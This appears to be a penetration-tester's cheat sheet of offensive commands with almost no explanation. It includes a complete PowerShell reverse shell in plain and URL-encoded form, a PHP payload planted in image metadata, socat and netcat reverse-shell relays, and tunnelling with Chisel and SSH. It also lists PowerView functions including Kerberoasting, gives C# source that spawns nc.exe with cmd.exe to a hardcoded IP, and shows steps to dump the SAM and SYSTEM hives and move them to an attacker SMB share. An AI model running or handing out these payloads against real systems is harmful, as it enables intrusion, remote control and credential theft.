# Vhost discovery:

- **Gobuster:**
```bash
gobuster vhost -u <URL to fuzz> -w <wordlist>
```
- **WFUZZ**
```bash
wfuzz -u <URL> -w <wordlist> -H "Host: FUZZ.example.com" --hc <status codes to hide>
```

# FUZZ RCE Parameters
```bash
wfuzz -u <http://example.com/?FUZZ=ls+-la> -w <wordlist> --hw 2
```
# Port Scanning with NetCat

```bash
nc -zv <IP> 1-65535
```
# Open Port in the firewall
```bash
firewall-cmd --zone=public --add-port PORT/tcp


# Using netsh

netsh advfirewall firewall add rule name="Chisel" dir=in action=allow protocol=tcp localport=PORT
```

# List Windows Services
```powershell
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```
# Check the permissions on the directory in Windows
```powershell
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
```
# Powershell Reverse Shell
```powershell
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


# Encoded command:

powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22%0A%0A
```
# Malicious Image using ExifTool
```bash
exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" image.jpeg.php
```

# Internal Network Acess (Port Forwarding)
#### Chisel :
> Make sure to add `socks5	127.0.0.1 1080` in **/etc/proxychains4.conf** file.
```powershell
==================== REVERSE PORT FORWARDING ============================

# On the local machine:

./chisel server -p 8000 --reverse

# On target host:

./chisel client <LHOST>:8000 R:socks


==================== PORT FORWARDING ============================

# Port Forwarding using Chisel

.\chisel.exe server -p 18000 --socks5        # On Target Host

chisel client 10.200.96.150:18000 1080:socks        # On Attacking machine
```
#### Internal Network access using SShuttle:
```bash
└─$ sshuttle -r <username>@<RHOST> <Internal IP/Subnet>    # Using credentials

└─ sshuttle -r <username>@<RHOST> --ssh-cmd "ssh -i id_rsa" <Internal IP/Subnet>    # using private key
```

#### Reverse Port forward using OpenSSH
```powershell
ssh-keygen  # Generate key
```
- Copy the contents of the public key (the file ending with `.pub`), then edit the `~/.ssh/authorized_keys` file on your own attacking machine. You may need to create the `~/.ssh` directory and `authorized_keys` file first
```powershell
sudo systemctl status ssh    # Check ssh status on attacking machine

sudo systemctl start ssh    # Start ssh on attacking machine

ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN

OR

ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
```
#### Reverse Shell Relay using Socat
```powershell
sudo nc -lvnp 443    # On Attacking Machine

./socat tcp-l:8000 tcp:ATTACKING_IP:443 &    # On Target Machine

nc 127.0.0.1 8000 -e /bin/bash    # On Target Machine
```

# Windows Enumeration using SEATBELT
```powershell
Seatbelt.exe -group=all

Seatbelt.exe -group=user

Seatbelt.exe -group=system

Seatbelt.exe -group=remote
```
# PowerView usage for Privilege Escalation
- #### Misc Functions:
```powershell
Export-PowerViewCSV             -   thread-safe CSV append
Resolve-IPAddress               -   resolves a hostname to an IP
ConvertTo-SID                   -   converts a given user/group name to a security identifier (SID)
Convert-ADName                  -   converts object names between a variety of formats
ConvertFrom-UACValue            -   converts a UAC int value to human readable form
Add-RemoteConnection            -   pseudo "mounts" a connection to a remote path using the specified credential object
Remove-RemoteConnection         -   destroys a connection created by New-RemoteConnection
Invoke-UserImpersonation        -   creates a new "runas /netonly" type logon and impersonates the token
Invoke-RevertToSelf             -   reverts any token impersonation
Get-DomainSPNTicket             -   request the kerberos ticket for a specified service principal name (SPN)
Invoke-Kerberoast               -   requests service tickets for kerberoast-able accounts and returns extracted ticket hashes
Get-PathAcl                     -   get the ACLs for a local/remote file path with optional group recursion
```
- #### Domain/LDAP Functions:
```powershell
Get-DomainDNSZone               -   enumerates the Active Directory DNS zones for a given domain
Get-DomainDNSRecord             -   enumerates the Active Directory DNS records for a given zone
Get-Domain                      -   returns the domain object for the current (or specified) domain
Get-DomainController            -   returns the domain controllers for the current (or specified) domain
Get-Forest                      -   returns the forest object for the current (or specified) forest
Get-ForestDomain                -   return all domains for the current (or specified) forest
Get-ForestGlobalCatalog         -   return all global catalogs for the current (or specified) forest
Find-DomainObjectPropertyOutlier-   finds user/group/computer objects in AD that have 'outlier' properties set
Get-DomainUser                  -   return all users or specific user objects in AD
New-DomainUser                  -   creates a new domain user (assuming appropriate permissions) and returns the user object
Set-DomainUserPassword          -   sets the password for a given user identity and returns the user object
Get-DomainUserEvent             -   enumerates account logon events (ID 4624) and Logon with explicit credential events
Get-DomainComputer              -   returns all computers or specific computer objects in AD
Get-DomainObject                -   returns all (or specified) domain objects in AD
Set-DomainObject                -   modifies a gven property for a specified active directory object
Get-DomainObjectAcl             -   returns the ACLs associated with a specific active directory object
Add-DomainObjectAcl             -   adds an ACL for a specific active directory object
Find-InterestingDomainAcl       -   finds object ACLs in the current (or specified) domain with modification rights set to non-built in objects
Get-DomainOU                    -   search for all organization units (OUs) or specific OU objects in AD
Get-DomainSite                  -   search for all sites or specific site objects in AD
Get-DomainSubnet                -   search for all subnets or specific subnets objects in AD
Get-DomainSID                   -   returns the SID for the current domain or the specified domain
Get-DomainGroup                 -   return all groups or specific group objects in AD
New-DomainGroup                 -   creates a new domain group (assuming appropriate permissions) and returns the group object
Get-DomainManagedSecurityGroup  -   returns all security groups in the current (or target) domain that have a manager set
Get-DomainGroupMember           -   return the members of a specific domain group
Add-DomainGroupMember           -   adds a domain user (or group) to an existing domain group, assuming appropriate permissions to do so
Get-DomainFileServer            -   returns a list of servers likely functioning as file servers
Get-DomainDFSShare              -   returns a list of all fault-tolerant distributed file systems for the current (or specified) domain
```
- #### GPO functions
```powershell
Get-DomainGPO                           -   returns all GPOs or specific GPO objects in AD
Get-DomainGPOLocalGroup                 -   returns all GPOs in a domain that modify local group memberships through 'Restricted Groups' or Group Policy preferences
Get-DomainGPOUserLocalGroupMapping      -   enumerates the machines where a specific domain user/group is a member of a specific local group, all through GPO correlation
Get-DomainGPOComputerLocalGroupMapping  -   takes a computer (or GPO) object and determines what users/groups are in the specified local group for the machine through GPO correlation
Get-DomainPolicy                        -   returns the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller
```
- #### Computer Enumeration Functions
```powershell
Get-NetLocalGroup                   -   enumerates the local groups on the local (or remote) machine
Get-NetLocalGroupMember             -   enumerates members of a specific local group on the local (or remote) machine
Get-NetShare                        -   returns open shares on the local (or a remote) machine
Get-NetLoggedon                     -   returns users logged on the local (or a remote) machine
Get-NetSession                      -   returns session information for the local (or a remote) machine
Get-RegLoggedOn                     -   returns who is logged onto the local (or a remote) machine through enumeration of remote registry keys
Get-NetRDPSession                   -   returns remote desktop/session information for the local (or a remote) machine
Test-AdminAccess                    -   rests if the current user has administrative access to the local (or a remote) machine
Get-NetComputerSiteName             -   returns the AD site where the local (or a remote) machine resides
Get-WMIRegProxy                     -   enumerates the proxy server and WPAD conents for the current user
Get-WMIRegLastLoggedOn              -   returns the last user who logged onto the local (or a remote) machine
Get-WMIRegCachedRDPConnection       -   returns information about RDP connections outgoing from the local (or remote) machine
Get-WMIRegMountedDrive              -   returns information about saved network mounted drives for the local (or remote) machine
Get-WMIProcess                      -   returns a list of processes and their owners on the local or remote machine
Find-InterestingFile                -   searches for files on the given path that match a series of specified criteria
```
- #### Threaded 'Meta'-Functions:
```powershell
Find-DomainUserLocation             -   finds domain machines where specific users are logged into
Find-DomainProcess                  -   finds domain machines where specific processes are currently running
Find-DomainUserEvent                -   finds logon events on the current (or remote domain) for the specified users
Find-DomainShare                    -   finds reachable shares on domain machines
Find-InterestingDomainShareFile     -   searches for files matching specific criteria on readable shares in the domain
Find-LocalAdminAccess               -   finds machines on the local domain where the current user has local administrator access
Find-DomainLocalGroupMember         -   enumerates the members of the specified local group on machines in the domain
```
- #### Domain Trust Functions:
```powershell
Get-DomainTrust                     -   returns all domain trusts for the current domain or a specified domain
Get-ForestTrust                     -   returns all forest trusts for the current forest or a specified forest
Get-DomainForeignUser               -   enumerates users who are in groups outside of the user's domain
Get-DomainForeignGroupMember        -   enumerates groups with users outside of the group's domain and returns each foreign member
Get-DomainTrustMapping              -   this function enumerates all trusts for the current domain and then enumerates all trusts for each domain it finds
```

# Malicious .cs code and make it executable using `MCS`
```cs
# Make a file named exploit.cs

using System;
using System.Diagnostics;
namespace exploit{
    class Program{
        static void Main(){
        	Process proc = new Process();
		ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc.exe", "10.50.76.115 9999 -e cmd.exe");
		procInfo.CreateNoWindow = true;
		proc.StartInfo = procInfo;
		proc.Start();
	}
    }
}


# Compile code using mcs cmd to make an executable binary.

└─$ mcs exploit.cs 
```
# Dump credentials on Windows machine.
```powershell
# On target windows machine
reg.exe save HKLM\SYSTEM system.bak
reg.exe save HKLM\SAM sam.bak


# On attacking machine
└─$ smbserver.py s . -smb2support -username user -password password

# On Windows target machine
net use \\10.50.76.115\s /USER:user password

move sam.bak \\10.50.76.115\s\sam.bak
move system.bak \\10.50.76.115\s\system.bak


# On attacking machine
└─$ secretsdump.py -sam sam.bak -system system.bak LOCAL
```
